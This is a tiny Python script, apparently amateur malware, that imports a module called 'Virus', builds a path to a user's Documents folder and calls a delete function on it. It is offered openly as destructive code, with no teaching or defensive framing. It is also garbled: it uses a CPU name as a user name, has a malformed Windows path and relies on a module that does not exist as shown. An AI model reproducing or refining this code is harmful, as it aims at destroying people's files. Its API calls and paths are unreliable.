import Virus
user = Virus.getCPUname()
Form = "C:/user/{}/documents"
APD = Form.format(user)
Virus.delete(APD)
